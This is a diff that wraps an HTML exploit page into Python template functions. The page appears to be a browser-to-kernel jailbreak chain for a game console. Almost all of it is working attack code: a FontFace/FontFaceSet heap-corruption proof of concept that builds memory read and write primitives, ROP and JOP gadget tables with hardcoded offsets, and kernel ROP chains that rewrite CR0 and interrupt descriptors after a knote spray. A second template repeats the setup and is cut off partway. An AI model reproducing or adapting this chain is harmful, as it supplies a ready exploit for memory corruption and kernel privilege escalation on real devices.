@@ -1,21 +1,22 @@
-<!DOCTYPE html><html>
+
+def FULL_TEMPLATE(): return """<!DOCTYPE html><html>
 <head>
 <title>Payload</title>
-<meta name=viewport content="width=device-width, initial-scale=1">
+<meta name=viewport content=\"width=device-width, initial-scale=1\">
 <style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
 <script>
 function payloadmsg() 
 {
-    document.getElementById("done").style.display = "none";
-    document.getElementById("exploit").style.display = "none";
-    document.getElementById("payload").style.display = "block";
+    document.getElementById(\"done\").style.display = \"none\";
+    document.getElementById(\"exploit\").style.display = \"none\";
+    document.getElementById(\"payload\").style.display = \"block\";
 }
 
 function donemsg() 
 {
-    document.getElementById("exploit").style.display = "none";
-    document.getElementById("payload").style.display = "none";
-    document.getElementById("done").style.display = "block";
+    document.getElementById(\"exploit\").style.display = \"none\";
+    document.getElementById(\"payload\").style.display = \"none\";
+    document.getElementById(\"done\").style.display = \"block\";
 }
 </script>
 <script>
@@ -104,7 +105,7 @@ function zeroFill(number, width) {
         return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
     }
 
-    return number + ""; // always return a string
+    return number + \"\"; // always return a string
 }
 
 function zeroFill(number, width) {
@@ -114,7 +115,7 @@ function zeroFill(number, width) {
         return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
     }
 
-    return number + ""; // always return a string
+    return number + \"\"; // always return a string
 }
 </script>
 <script>
@@ -162,41 +163,41 @@ window.rop = function () {
     }
 
     this.push_write8 = function (where, what) {
-        this.push(gadgets["pop rdi"]);
+        this.push(gadgets[\"pop rdi\"]);
         this.push(where);
-        this.push(gadgets["pop rsi"]);
+        this.push(gadgets[\"pop rsi\"]);
         this.push(what);
-        this.push(gadgets["mov [rdi], rsi"]);
+        this.push(gadgets[\"mov [rdi], rsi\"]);
     }
 
     this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
         if (rdi != undefined) {
-            this.push(gadgets["pop rdi"]);
+            this.push(gadgets[\"pop rdi\"]);
             this.push(rdi);
         }
 
         if (rsi != undefined) {
-            this.push(gadgets["pop rsi"]);
+            this.push(gadgets[\"pop rsi\"]);
             this.push(rsi);
         }
 
         if (rdx != undefined) {
-            this.push(gadgets["pop rdx"]);
+            this.push(gadgets[\"pop rdx\"]);
             this.push(rdx);
         }
 
         if (rcx != undefined) {
-            this.push(gadgets["pop rcx"]);
+            this.push(gadgets[\"pop rcx\"]);
             this.push(rcx);
         }
 
         if (r8 != undefined) {
-            this.push(gadgets["pop r8"]);
+            this.push(gadgets[\"pop r8\"]);
             this.push(r8);
         }
 
         if (r9 != undefined) {
-            this.push(gadgets["pop r9"]);
+            this.push(gadgets[\"pop r9\"]);
             this.push(r9);
         }
 
@@ -220,18 +221,18 @@ window.rop = function () {
         return this.stack.add32(this.count * 8);
     }
     this.write_result = function (where) {
-        this.push(gadgets["pop rdi"]);
+        this.push(gadgets[\"pop rdi\"]);
         this.push(where);
-        this.push(gadgets["mov [rdi], rax"]);
+        this.push(gadgets[\"mov [rdi], rax\"]);
     }
     this.write_result4 = function (where) {
-        this.push(gadgets["pop rdi"]);
+        this.push(gadgets[\"pop rdi\"]);
         this.push(where);
-        this.push(gadgets["mov [rdi], eax"]);
+        this.push(gadgets[\"mov [rdi], eax\"]);
     }
 
     this.jmp_rsp = function (rsp) {
-        this.push(window.gadgets["pop rsp"]);
+        this.push(window.gadgets[\"pop rsp\"]);
         this.push(rsp);
     }
 
@@ -246,40 +247,40 @@ window.rop = function () {
     }
 
     this.rax_kernel = function (offset) {
-        this.push(gadgets["pop rax"]);
+        this.push(gadgets[\"pop rax\"]);
         this.push(this.KERNEL_BASE_PTR_VAR)
-        this.push(gadgets["mov rax, [rax]"]);
-        this.push(gadgets["pop rsi"]);
+        this.push(gadgets[\"mov rax, [rax]\"]);
+        this.push(gadgets[\"pop rsi\"]);
         this.push(offset)
-        this.push(gadgets["add rax, rsi"]);
+        this.push(gadgets[\"add rax, rsi\"]);
     }
 
     this.write_kernel_addr_to_chain_later = function (offset) {
-        this.push(gadgets["pop rdi"]);
+        this.push(gadgets[\"pop rdi\"]);
         var idx = this.pushSymbolic();
         this.rax_kernel(offset);
-        this.push(gadgets["mov [rdi], rax"]);
+        this.push(gadgets[\"mov [rdi], rax\"]);
         return idx;
     }
 
     this.kwrite8 = function (offset, qword) {
         this.rax_kernel(offset);
-        this.push(gadgets["pop rsi"]);
+        this.push(gadgets[\"pop rsi\"]);
         this.push(qword);
-        this.push(gadgets["mov [rax], rsi"]);
+        this.push(gadgets[\"mov [rax], rsi\"]);
     }
     this.kwrite4 = function (offset, dword) {
         this.rax_kernel(offset);
-        this.push(gadgets["pop rdx"]);
+        this.push(gadgets[\"pop rdx\"]);
         this.push(dword);
-        this.push(gadgets["mov [rax], edx"]);
+        this.push(gadgets[\"mov [rax], edx\"]);
     }
 
     this.kwrite8_kaddr = function (offset1, offset2) {
         this.rax_kernel(offset2);
-        this.push(gadgets["mov rdx, rax"]);
+        this.push(gadgets[\"mov rdx, rax\"]);
         this.rax_kernel(offset1);
-        this.push(gadgets["mov [rax], rdx"]);
+        this.push(gadgets[\"mov [rax], rdx\"]);
     }
     return this;
 };
@@ -297,7 +298,7 @@ var webKitRequirementBase;
 var libSceLibcInternalBase;
 var libKernelBase;
 
-var textArea = document.createElement("textarea");
+var textArea = document.createElement(\"textarea\");
 
 const OFFSET_wk_vtable_first_element = 0x104F110;
 const OFFSET_WK_memset_import = 0x000002A8;
@@ -326,49 +327,49 @@ var nogc = [];
 var syscalls = {};
 var gadgets = {};
 var wk_gadgetmap = {
-    "ret": 0x32,
-    "pop rdi": 0x319690,
-    "pop rsi": 0x1F4D6,
-    "pop rdx": 0x986C,
-    "pop rcx": 0x657B7,
-    "pop r8": 0xAFAA71,
-    "pop r9": 0x422571,
-    "pop rax": 0x51A12,
-    "pop rsp": 0x4E293,
+    \"ret\": 0x32,
+    \"pop rdi\": 0x319690,
+    \"pop rsi\": 0x1F4D6,
+    \"pop rdx\": 0x986C,
+    \"pop rcx\": 0x657B7,
+    \"pop r8\": 0xAFAA71,
+    \"pop r9\": 0x422571,
+    \"pop rax\": 0x51A12,
+    \"pop rsp\": 0x4E293,
 
-    "mov [rdi], rsi": 0x1A97920,
-    "mov [rdi], rax": 0x10788F7,
-    "mov [rdi], eax": 0x9964BC,
+    \"mov [rdi], rsi\": 0x1A97920,
+    \"mov [rdi], rax\": 0x10788F7,
+    \"mov [rdi], eax\": 0x9964BC,
 
-    "cli ; pop rax": 0x566F8,
-    "sti": 0x1FBBCC,
+    \"cli ; pop rax\": 0x566F8,
+    \"sti\": 0x1FBBCC,
 
-    "mov rax, [rax]": 0x241CC,
-    "mov rax, [rsi]": 0x5106A0,
-    "mov [rax], rsi": 0x1EFD890,
-    "mov [rax], rdx": 0x1426A82,
-    "mov [rax], edx": 0x3B7FE4,
-    "add rax, rsi": 0x170397E,
-    "mov rdx, rax": 0x53F501,
-    "add rax, rcx": 0x2FBCD,
-    "mov rsp, rdi": 0x2048062,
-    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
-    "infloop": 0x7DFF
+    \"mov rax, [rax]\": 0x241CC,
+    \"mov rax, [rsi]\": 0x5106A0,
+    \"mov [rax], rsi\": 0x1EFD890,
+    \"mov [rax], rdx\": 0x1426A82,
+    \"mov [rax], edx\": 0x3B7FE4,
+    \"add rax, rsi\": 0x170397E,
+    \"mov rdx, rax\": 0x53F501,
+    \"add rax, rcx\": 0x2FBCD,
+    \"mov rsp, rdi\": 0x2048062,
+    \"mov rdi, [rax + 8] ; call [rax]\": 0x751EE7,
+    \"infloop\": 0x7DFF
 };
 
 var wkr_gadgetmap = {
-    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
+    \"xchg rdi, rsp ; call [rsi - 0x79]\": 0x1d74f0 //JOP 3
 };
 
 var wk2_gadgetmap = {
-    "mov [rax], rdi": 0xFFDD7,
-    "mov [rax], rcx": 0x2C9ECA,
+    \"mov [rax], rdi\": 0xFFDD7,
+    \"mov [rax], rcx\": 0x2C9ECA,
 };
 var hmd_gadgetmap = {
-    "add [r8], r12": 0x2BCE1
+    \"add [r8], r12\": 0x2BCE1
 };
 var ipmi_gadgetmap = {
-    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
+    \"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]\": 0x344B
 };
 
 function userland() {
@@ -453,7 +454,7 @@ function userland() {
     }
 
     function readstr(addr) {
-        var str = "";
+        var str = \"\";
         for (var i = 0;; i++) {
             var c = p.read1(addr.add32(i));
             if (c == 0x0) {
@@ -494,13 +495,13 @@ function userland() {
     p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
 
     function launch_chain(chain) {
-        chain.push(window.gadgets["pop rdi"]);
+        chain.push(window.gadgets[\"pop rdi\"]);
         chain.push(original_context);
         chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
 
         p.write8(textAreaVtPtr, fakeVtable_setjmp);
         textArea.scrollLeft = 0x0;
-        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
+        p.write8(modified_context.add32(0x00), window.gadgets[\"ret\"]);
         p.write8(modified_context.add32(0x10), chain.stack);
         p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))
 
@@ -588,19 +589,19 @@ function load_prx(name) {
     //sys_dynlib_load_prx
     var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
     if (res.low != 0x0) {
-        alert("failed to load prx/get handle " + name);
+        alert(\"failed to load prx/get handle \" + name);
     }
     //sys_dynlib_get_info_ex
     p.write8(ex_info, 0x1A8);
     res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
     if (res.low != 0x0) {
-        alert("failed to get module info from handle");
+        alert(\"failed to get module info from handle\");
     }
     var tlsinit = p.read8(ex_info.add32(0x110));
     var tlssize = p.read4(ex_info.add32(0x11C));
 
     if (tlssize != 0) {
-        if (name == "libSceWebKit2.sprx") {
+        if (name == \"libSceWebKit2.sprx\") {
             tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
         } else {
             alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
@@ -617,9 +618,9 @@ function extra_gadgets() {
     chain.syscall(602, 0, randomized_path_ptr);
     random_path = p.readstr(randomized_path_ptr);
 
-    var ipmi_addr = load_prx("libSceIpmi.sprx");
-    var hmd_addr = load_prx("libSceHmd.sprx");
-    var wk2_addr = load_prx("libSceWebKit2.sprx");
+    var ipmi_addr = load_prx(\"libSceIpmi.sprx\");
+    var hmd_addr = load_prx(\"libSceHmd.sprx\");
+    var wk2_addr = load_prx(\"libSceWebKit2.sprx\");
 
     for (var gadget in hmd_gadgetmap) {
         window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
@@ -676,34 +677,34 @@ function kchain_setup() {
     kchain.set_kernel_var(KERNEL_BASE_PTR);
     kchain2.set_kernel_var(KERNEL_BASE_PTR);
 
-    kchain.push(gadgets["pop rax"]);
+    kchain.push(gadgets[\"pop rax\"]);
     kchain.push(SAVED_KERNEL_STACK_PTR);
-    kchain.push(gadgets["mov [rax], rdi"]);
-    kchain.push(gadgets["pop r8"]);
+    kchain.push(gadgets[\"mov [rax], rdi\"]);
+    kchain.push(gadgets[\"pop r8\"]);
     kchain.push(KERNEL_BASE_PTR);
-    kchain.push(gadgets["add [r8], r12"]);
+    kchain.push(gadgets[\"add [r8], r12\"]);
 
 
 
     var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
     var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
     //Modify UD
-    kchain.push(gadgets["pop rdi"]);
+    kchain.push(gadgets[\"pop rdi\"]);
     kchain.push(0x6);
-    kchain.push(gadgets["pop rsi"]);
-    kchain.push(gadgets["mov rsp, rdi"]);
-    kchain.push(gadgets["pop rdx"]);
+    kchain.push(gadgets[\"pop rsi\"]);
+    kchain.push(gadgets[\"mov rsp, rdi\"]);
+    kchain.push(gadgets[\"pop rdx\"]);
     kchain.push(0xE);
-    kchain.push(gadgets["pop rcx"]);
+    kchain.push(gadgets[\"pop rcx\"]);
     kchain.push(0x0);
-    kchain.push(gadgets["pop r8"]);
+    kchain.push(gadgets[\"pop r8\"]);
     kchain.push(0x0);
     var idx1_dest = kchain.get_rsp();
     kchain.pushSymbolic(); // overwritten with KERNEL_setidt
 
-    kchain.push(gadgets["pop rsi"]);
+    kchain.push(gadgets[\"pop rsi\"]);
     kchain.push(0x80040033);
-    kchain.push(gadgets["pop rdi"]);
+    kchain.push(gadgets[\"pop rdi\"]);
     kchain.push(kchain2.stack);
     var idx2_dest = kchain.get_rsp();
     kchain.pushSymbolic(); // overwritten with KERNEL_setcr0
@@ -715,16 +716,16 @@ function kchain_setup() {
 
     var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
     var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
-    kchain2.push(gadgets["pop rdi"]);
+    kchain2.push(gadgets[\"pop rdi\"]);
     kchain2.push(0x6);
-    kchain2.push(gadgets["pop rsi"]);
+    kchain2.push(gadgets[\"pop rsi\"]);
     var idx3_dest = kchain2.get_rsp();
     kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
-    kchain2.push(gadgets["pop rdx"]);
+    kchain2.push(gadgets[\"pop rdx\"]);
     kchain2.push(0xE);
-    kchain2.push(gadgets["pop rcx"]);
+    kchain2.push(gadgets[\"pop rcx\"]);
     kchain2.push(0x0);
-    kchain2.push(gadgets["pop r8"]);
+    kchain2.push(gadgets[\"pop r8\"]);
     kchain2.push(0x0);
     var idx4_dest = kchain2.get_rsp();
     kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 
@@ -757,7 +758,7 @@ function kchain_setup() {
     //Restore CR0
     kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
     var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
-    kchain2.push(gadgets["pop rdi"]);
+    kchain2.push(gadgets[\"pop rdi\"]);
     kchain2.push(0x80050033);
     var idx5_dest = kchain2.get_rsp();
     kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
@@ -766,19 +767,19 @@ function kchain_setup() {
 
     //Recover
     kchain2.rax_kernel(KERNEL_kqueue_close_epi);
-    kchain2.push(gadgets["mov rdx, rax"]);
-    kchain2.push(gadgets["pop rsi"]);
+    kchain2.push(gadgets[\"mov rdx, rax\"]);
+    kchain2.push(gadgets[\"pop rsi\"]);
     kchain2.push(SAVED_KERNEL_STACK_PTR);
-    kchain2.push(gadgets["mov rax, [rsi]"]);
-    kchain2.push(gadgets["pop rcx"]);
+    kchain2.push(gadgets[\"mov rax, [rsi]\"]);
+    kchain2.push(gadgets[\"pop rcx\"]);
     kchain2.push(0x10);
-    kchain2.push(gadgets["add rax, rcx"]);
-    kchain2.push(gadgets["mov [rax], rdx"]);
-    kchain2.push(gadgets["pop rdi"]);
+    kchain2.push(gadgets[\"add rax, rcx\"]);
+    kchain2.push(gadgets[\"mov [rax], rdx\"]);
+    kchain2.push(gadgets[\"pop rdi\"]);
     var idx6 = kchain2.pushSymbolic();
-    kchain2.push(gadgets["mov [rdi], rax"]);
-    kchain2.push(gadgets["sti"]);
-    kchain2.push(gadgets["pop rsp"]);
+    kchain2.push(gadgets[\"mov [rdi], rax\"]);
+    kchain2.push(gadgets[\"sti\"]);
+    kchain2.push(gadgets[\"pop rsp\"]);
     var idx6_dest = kchain2.get_rsp();
     kchain2.pushSymbolic(); // overwritten with old stack pointer
     kchain2.finalizeSymbolic(idx6, idx6_dest);
@@ -790,7 +791,7 @@ function object_setup() {
     var fake_filtops = fake_knote.add32(0x4000);
     var fake_obj = fake_knote.add32(0x8000);
     if (fake_knote.low != 0x4000) {
-        alert("enomem: " + fake_knote);
+        alert(\"enomem: \" + fake_knote);
         while (1);
     }
     //setup fake object
@@ -801,14 +802,14 @@ function object_setup() {
     }
     //FILTOPS
     {
-        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
-        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
+        p.write8(fake_filtops.sub32(0x79), gadgets[\"cli ; pop rax\"]); //cli ; pop rax ; ret
+        p.write8(fake_filtops.add32(0x0), gadgets[\"xchg rdi, rsp ; call [rsi - 0x79]\"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
         p.write8(fake_filtops.add32(0x8), kchain.stack);
-        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
+        p.write8(fake_filtops.add32(0x10), gadgets[\"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]\"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
     }
     //OBJ
     {
-        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
+        p.write8(fake_obj.add32(0x30), gadgets[\"mov rdi, [rax + 8] ; call [rax]\"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
     }
 }
 
@@ -832,7 +833,7 @@ var trigger_spray = function () {
 
     var that_one_socket = chain.syscall(97, 2, 1, 0);
     if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
-        alert("invalid socket");
+        alert(\"invalid socket\");
         while (1);
     }
 
@@ -858,7 +859,7 @@ var trigger_spray = function () {
     chain.run();
 
     //Trigger OOB
-    alert("Insert USB Drive And Click OK When You See The Popup Notification");
+    alert(\"Insert USB Drive And Click OK When You See The Popup Notification\");
 	
     //Trigger corrupt knote
     {
@@ -870,7 +871,7 @@ var trigger_spray = function () {
 	if (chain.syscall(23, 0).low == 0) {
 		return;
 	}
-	alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
+	alert(\"failed to trigger exploit kernel heap might be corrupted, try again or reboot the console\");
     p.write8(0, 0);
 	return;
 }
@@ -884,7 +885,7 @@ var SPRAY_FONTS = 0x100a;
 var GUESS_FONT = 0x200430000;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
-var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
+var HAMMER_FONT_NAME = \"font8\"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
@@ -897,9 +898,9 @@ function poc() {
     var bad_fonts = [];
 
     for (var i = 0; i < SPRAY_FONTS; i++)
-        bad_fonts.push(new FontFace("font1", "", {}));
+        bad_fonts.push(new FontFace(\"font1\", \"\", {}));
 
-    var good_font = new FontFace("font2", "url(data:text/html,)", {});
+    var good_font = new FontFace(\"font2\", \"url(data:text/html,)\", {});
     bad_fonts.push(good_font);
 
     var arrays = [];
@@ -964,7 +965,7 @@ function poc() {
         for (var i = 0; i < 256; i++)
             mkString(HASHMAP_BUCKET, p_s);
 
-        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
+        var ffs = ffses[\"search_\" + (++round)] = new FontFaceSet(bad_fonts);
 
         var badstr1 = mkString(HASHMAP_BUCKET, p_s);
 
@@ -972,7 +973,7 @@ function poc() {
         var guessed_addr = null;
 
         for (var i = 0; i < SPRAY_FONTS; i++) {
-            bad_fonts[i].family = "search" + round;
+            bad_fonts[i].family = \"search\" + round;
             if (badstr1.substr(0, p_s.length) != p_s) {
                 guessed_font = i;
                 var p_s1 = badstr1.substr(0, p_s.length);
@@ -1008,11 +1009,11 @@ function poc() {
 
     var needfix = [];
     for (var i = 0;; i++) {
-        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
+        ffses[\"ffs_leak_\" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
         var badstr2 = mkString(HASHMAP_BUCKET, p_s);
         needfix.push(mkString(HASHMAP_BUCKET, p_s));
-        bad_fonts[guessed_font].family = "evil2";
-        bad_fonts[guessed_font + 1].family = "evil3";
+        bad_fonts[guessed_font].family = \"evil2\";
+        bad_fonts[guessed_font + 1].family = \"evil3\";
         var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
         if (leak < 0x1000000000000)
             break;
@@ -1036,9 +1037,9 @@ function poc() {
         var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
         mkString(HASHMAP_BUCKET, p_s);
         var relative_read = mkString(HASHMAP_BUCKET, fake_s);
-        bad_fonts[guessed_font].family = ffs_name + "_evil1";
-        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
-        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
+        bad_fonts[guessed_font].family = ffs_name + \"_evil1\";
+        bad_fonts[guessed_font + 1].family = ffs_name + \"_evil2\";
+        bad_fonts[guessed_font + 2].family = ffs_name + \"_evil3\";
         needfix.push(relative_read);
         if (relative_read.length < 1000) //failed
             return makeReader(read_addr, ffs_name + '_');
@@ -1126,7 +1127,7 @@ function poc() {
 
     var ffs8_args = [bad_fonts[guessed_font + 12]];
     for (var i = 0; i < 5; i++)
-        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
+        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, \"url(data:text/html,)\", {}));
 
     for (var i = 0; i < HAMMER_NSTRINGS; i++)
         mkString(HASHMAP_BUCKET, pp_s);
@@ -1138,7 +1139,7 @@ function poc() {
     needfix.push(post_ffs);
 
     for (var i = 0; i < 13; i++)
-        bad_fonts[guessed_font + i].family = "hammer" + i;
+        bad_fonts[guessed_font + i].family = \"hammer\" + i;
 
     function boot_addrof(obj) {
         arrays[257][32] = obj;
@@ -1245,7 +1246,7 @@ function poc() {
         //fix fontfaceset (memmoved 96 bytes to low, move back)
         var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
         write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
-        //fix strings (restore "valid") header
+        //fix strings (restore \"valid\") header
         for (var i = 0; i < needfix.length; i++) {
             var addr = read_ptr_at(addrof(needfix[i]) + 8);
             write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
@@ -1338,9 +1339,632 @@ function poc() {
 }
 </script>
 </head>
-<body onload="setTimeout(poc, 1500);">
-<div id="exploit" class="info">Loading Exploit, Please Wait ...</div>
-<div id="payload" class="info" style="display:none;">Loading Payload...</div>
-<div id="done" class="info" style="display:none;">Payload Loaded.</div>
+<body onload=\"setTimeout(poc, 1500);\">
+<div id=\"exploit\" class=\"info\">Loading Exploit, Please Wait ...</div>
+<div id=\"payload\" class=\"info\" style=\"display:none;\">Loading Payload...</div>
+<div id=\"done\" class=\"info\" style=\"display:none;\">Payload Loaded.</div>
 </body>
-</html>
+</html>"""
+
+
+def JSREQ_TEMPLATE(): return """<!DOCTYPE html><html>
+<head>
+<title>Payload</title>
+<meta name=viewport content=\"width=device-width, initial-scale=1\">
+<style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
+<script src=\"./int64.js\"></script>
+<script src=\"./rop.js\"></script>
+<script>
+function payloadmsg() 
+{
+    document.getElementById(\"done\").style.display = \"none\";
+    document.getElementById(\"exploit\").style.display = \"none\";
+    document.getElementById(\"payload\").style.display = \"block\";
+}
+
+function donemsg() 
+{
+    document.getElementById(\"exploit\").style.display = \"none\";
+    document.getElementById(\"payload\").style.display = \"none\";
+    document.getElementById(\"done\").style.display = \"block\";
+}
+</script>
+<script>
+var chain;
+var kchain;
+var kchain2;
+var SAVED_KERNEL_STACK_PTR;
+var KERNEL_BASE_PTR;
+
+var webKitBase;
+var webKitRequirementBase;
+
+var libSceLibcInternalBase;
+var libKernelBase;
+
+var textArea = document.createElement(\"textarea\");
+
+const OFFSET_wk_vtable_first_element = 0x104F110;
+const OFFSET_WK_memset_import = 0x000002A8;
+const OFFSET_WK___stack_chk_fail_import = 0x00000178;
+const OFFSET_WK_psl_builtin_import = 0xD68;
+
+const OFFSET_WKR_psl_builtin = 0x33BA0;
+
+const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
+const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
+const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
+const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
+
+const OFFSET_libcint_memset = 0x0004F810;
+const OFFSET_libcint_setjmp = 0x000BB5BC;
+const OFFSET_libcint_longjmp = 0x000BB616;
+
+const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
+
+
+const OFFSET_lk___stack_chk_fail = 0x0001FF60;
+const OFFSET_lk_pthread_create = 0x00025510;
+const OFFSET_lk_pthread_join = 0x0000AFA0;
+
+var nogc = [];
+var syscalls = {};
+var gadgets = {};
+var wk_gadgetmap = {
+    \"ret\": 0x32,
+    \"pop rdi\": 0x319690,
+    \"pop rsi\": 0x1F4D6,
+    \"pop rdx\": 0x986C,
+    \"pop rcx\": 0x657B7,
+    \"pop r8\": 0xAFAA71,
+    \"pop r9\": 0x422571,
+    \"pop rax\": 0x51A12,
+    \"pop rsp\": 0x4E293,
+
+    \"mov [rdi], rsi\": 0x1A97920,
+    \"mov [rdi], rax\": 0x10788F7,
+    \"mov [rdi], eax\": 0x9964BC,
+
+    \"cli ; pop rax\": 0x566F8,
+    \"sti\": 0x1FBBCC,
+
+    \"mov rax, [rax]\": 0x241CC,
+    \"mov rax, [rsi]\": 0x5106A0,
+    \"mov [rax], rsi\": 0x1EFD890,
+    \"mov [rax], rdx\": 0x1426A82,
+    \"mov [rax], edx\": 0x3B7FE4,
+    \"add rax, rsi\": 0x170397E,
+    \"mov rdx, rax\": 0x53F501,
+    \"add rax, rcx\": 0x2FBCD,
+    \"mov rsp, rdi\": 0x2048062,
+    \"mov rdi, [rax + 8] ; call [rax]\": 0x751EE7,
+    \"infloop\": 0x7DFF
+};
+
+var wkr_gadgetmap = {
+    \"xchg rdi, rsp ; call [rsi - 0x79]\": 0x1d74f0 //JOP 3
+};
+
+var wk2_gadgetmap = {
+    \"mov [rax], rdi\": 0xFFDD7,
+    \"mov [rax], rcx\": 0x2C9ECA,
+};
+var hmd_gadgetmap = {
+    \"add [r8], r12\": 0x2BCE1
+};
+var ipmi_gadgetmap = {
+    \"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]\": 0x344B
+};
+
+function userland() {
+
+    p.launch_chain = launch_chain;
+    p.malloc = malloc;
+    p.malloc32 = malloc32;
+    p.stringify = stringify;
+    p.array_from_address = array_from_address;
+    p.readstr = readstr;
+
+    var textAreaAddr = p.leakval(textArea);
+    var textAreVtablePtrPtr = textAreaAddr.add32(0x18);
+    var textAreaVtPtr = p.read8(textAreVtablePtrPtr);
+
+    //pointer to vtable address
+    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
+    //address of vtable
+    var textAreaVtable = p.read8(textAreaVtPtr);
+    //use address of 1st entry (in .text) to calculate webkitbase
+    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
+
+    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
+    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
+
+    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
+    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
+
+    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
+    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
+
+    for (var gadget in wk_gadgetmap) {
+        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
+    }
+    for (var gadget in wkr_gadgetmap) {
+        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
+    }
+
+    function get_jmptgt(address) {
+        var instr = p.read4(address) & 0xFFFF;
+        var offset = p.read4(address.add32(2));
+        if (instr != 0x25FF) {
+            return 0;
+        }
+        return address.add32(0x6 + offset);
+    }
+
+    function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+
+    function malloc32(sz) {
+        var backing = new Uint8Array(0x10000 + sz * 4);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+
+    function array_from_address(addr, size) {
+        var og_array = new Uint32Array(0x1000);
+        var og_array_i = p.leakval(og_array).add32(0x10);
+
+        p.write8(og_array_i, addr);
+        p.write4(og_array_i.add32(8), size);
